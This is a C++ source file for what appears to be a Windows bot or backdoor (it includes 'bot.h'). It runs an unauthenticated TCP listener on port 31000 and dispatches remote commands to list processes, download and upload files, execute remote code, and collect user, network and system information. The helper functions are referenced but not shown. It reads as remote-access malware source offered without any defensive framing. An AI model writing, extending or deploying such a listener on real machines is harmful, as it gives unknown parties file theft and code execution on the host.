#include "bot.h"

#define WIN32_LEAN_AND_MEAN
#define BUF_SIZE 2000

using namespace std;

// our thread for sending/recving commands
DWORD WINAPI doStuff(LPVOID lpParam)
{
    SOCKET current_client = (SOCKET)lpParam;    // set our socket to the socket passed in as a parameter
    char recvbuf[BUF_SIZE];                      // buffer to hold our received data
    char sendbuf[BUF_SIZE];                    // buffer to hold our sent data
    int errCode;
    string cmdOption;

    cout << "Client socket:"<< (int)current_client << endl;
    // our recv loop
    do
    {
        //char* splitString;
        memset(&recvbuf, 0, sizeof(recvbuf));
        // Receive function option from user
        errCode = recv(current_client, recvbuf, BUF_SIZE, 0);

        if (errCode > 0){
            printf("Data received: %s\n", recvbuf);
            switch(atoi(recvbuf)){
                case 0:{
                    printf("Exiting...\n");
                    send_data(current_client, "<END>");
                    return 0;
                }
                case 1:{
                    process_list(current_client);
                    break;
                }
                case 2:{
                    memset(&recvbuf, 0, sizeof(recvbuf));
                    // Receive the filename
                    errCode = recv(current_client, recvbuf, BUF_SIZE, 0);
                    dl_file(current_client, recvbuf);
                    break;
                }
                case 3:{
                    memset(&recvbuf, 0, sizeof(recvbuf));
                    // Receive filename
                    errCode = recv(current_client, recvbuf, BUF_SIZE, 0);
                    ul_file(current_client, recvbuf);
                    break;
                }
                case 4:{
                    memset(&recvbuf, 0, sizeof(recvbuf));
                    // Receive remote code
                    errCode = recv(current_client, recvbuf, BUF_SIZE, 0);
                    rce(current_client, recvbuf);
                    break;
                }
                case 5:{
                    net_info(current_client);
                    break;
                }
                case 6:{
                    whoami(current_client);
                    break;
                }
                case 7:{
                    sys_info(current_client);
                    break;
                }
            }
        } else if (errCode == 0){
            printf("Connection closed...\n");
            break;
        } else {
            //printf("Failed to receive data: %d\n", WSAGetLastError());
        }
        //printf("%s\n", recvbuf);
        send_data(current_client, "<END>");
    }while(true);
    printf("Im out");

    return 0;
}

int main()
{

	printf("Starting up multi-threaded TCP server\n");

    // our masterSocket(socket that listens for connections)
    SOCKET sock;

    // for our thread
    DWORD thread;

    WSADATA wsaData;
    sockaddr_in server;

    // start winsock
    printf("Initializing Winsock...\n");
    int ret = WSAStartup(0x101,&wsaData); // use highest version of winsock avalible
            if(ret != 0)
    {
        printf("Failed to initialize Winsock. Error Code : %d\n", WSAGetLastError());
        return 1;
    }
    printf("Initiazed.\n");

    // fill in winsock struct ...
    server.sin_family=AF_INET;
    server.sin_addr.s_addr=INADDR_ANY;
    server.sin_port=htons(31000); // listen on telnet port 31000

    // create our socket to be connected to
    sock=socket(AF_INET,SOCK_STREAM,0);
    if(sock == INVALID_SOCKET)
    {
        return 0;
    }

    // bind our socket to a port
    printf("Binding socket to port\n");
    if( bind(sock,(sockaddr*)&server,sizeof(server)) !=0 )
    {
        printf("Bind socket to port Failed...");
        return 0;
    }

    // listen for a connection
    if(listen(sock,5) != 0)
    {
        printf("No longer listening for connection...\n");
        return 0;
    }

    // socket that we send and receive data on
    SOCKET client;

    sockaddr_in from;
    int fromlen = sizeof(from);

    // loop forever
    printf("Waiting to accept connections...");
    while(true)
    {
        // accept connections
        client = accept(sock,(struct sockaddr*)&from,&fromlen);
        printf("Client connected\r\n");
        cout << "client before thread:" << (int) client << endl;
        // create our recv_cmds thread and pass client socket as a parameter
        CreateThread(NULL, 0,doStuff,(LPVOID)client, 0, &thread);
        printf("New thread made!\n");
    }

    WSACleanup();

    system("pause");
  	return 0;

}
